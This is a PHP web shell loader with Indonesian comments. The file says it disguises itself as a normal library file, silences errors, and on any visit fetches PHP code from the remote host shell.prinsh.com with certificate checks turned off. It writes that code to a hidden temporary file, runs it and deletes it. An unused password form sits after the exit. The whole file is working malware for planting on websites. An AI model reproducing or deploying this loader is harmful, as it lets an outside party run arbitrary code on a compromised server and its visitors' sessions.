<?php
session_start();

// Anti delete: disguise as normal library file
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', 0);

// Obfuscation nama variabel
$u = 'https://shell.prinsh.com/Nathan/gelay.txt';
$fallback_code = "<?php echo 'Fallback aktif'; ?>";

// Function pengambil konten dari remote
function fetchRemote($url) {
    if (!function_exists('curl_exec')) return false;
    $c = curl_init($url);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($c, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla');
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($c, CURLOPT_TIMEOUT, 10);
    curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
    $r = curl_exec($c);
    curl_close($c);
    return $r;
}

// Fungsi eksekusi konten secara silent
function execPayload($code) {
    $temp = sys_get_temp_dir() . '/.' . md5(__FILE__) . '.php';
    file_put_contents($temp, $code);
    include $temp;
    unlink($temp); // Optional: hapus setelah dijalankan
}

// Autologin simple
if (!isset($_SESSION['go'])) {
    $_SESSION['go'] = true;
    $_SESSION['ck'] = md5(date('Y-m-d')); // dummy session marker
}

// Eksekusi hanya jika sudah login
if ($_SESSION['go'] === true) {
    $code = fetchRemote($u);
    if (!$code || strpos($code, '<?php') === false) {
        $code = $fallback_code;
    }
    execPayload($code);
    exit;
}

// Optional: Form login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    if (md5($_POST['pass']) === '6effe27d6aad2e8a76dc35373aeae74a') {
        $_SESSION['go'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo "Password salah";
    }
}

?>